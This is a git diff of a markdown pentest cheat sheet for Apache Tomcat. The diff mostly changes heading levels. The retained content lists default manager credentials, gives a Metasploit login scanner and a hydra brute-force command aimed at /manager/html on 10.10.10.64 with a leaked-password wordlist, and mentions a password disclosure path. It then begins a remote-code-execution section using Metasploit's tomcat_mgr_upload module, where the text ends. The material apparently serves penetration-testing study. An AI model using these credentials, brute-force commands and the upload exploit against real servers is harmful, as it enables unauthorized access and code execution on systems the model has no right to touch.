@@ -1,5 +1,6 @@
-# No Account
-## default creds
+# 🐈 Tomcat
+## No Account
+### Default Credentials
 admin:admin
 tomcat:tomcat
 admin:
@@ -8,7 +9,7 @@ tomcat:s3cr3t
 tomcat:s3cret
 admin:tomcat
 
-## bruteforce
+### Bruteforce
 ```bash
 # metasploit
 msf> use auxiliary/scanner/http/tomcat_mgr_login
@@ -17,14 +18,14 @@ msf> use auxiliary/scanner/http/tomcat_mgr_login
 hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
 ```
 
-## Passwords Backtrace disclosure
+### Passwords Backtrace disclosure
 /auth.jsp
 
-# With Account
-## Manager - RCE
+## With Account
+### Manager - RCE
 >You will only be able to deploy a **WAR** file if you have enough privileges (roles: admin, manager and manager-script). Those details can be find under tomcat-users.xml usually defined in /usr/share/tomcat9/etc/tomcat-users.xml (it vary between versions)
 
-### PoC
+#### PoC
 ```bash
 # metasploit
 use exploit/multi/http/tomcat_mgr_upload
